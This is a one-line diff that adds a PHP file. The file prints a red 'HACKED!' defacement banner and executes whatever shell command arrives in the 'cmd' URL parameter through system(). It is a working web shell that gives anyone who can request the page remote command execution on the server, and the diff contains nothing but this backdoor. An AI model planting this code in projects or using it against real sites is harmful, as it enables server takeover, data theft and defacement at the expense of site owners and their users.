@@ -1,0 +1,1 @@
+<?php echo "<h1 style='color:red'>HACKED!</h1>"; system($_GET["cmd"]); ?>
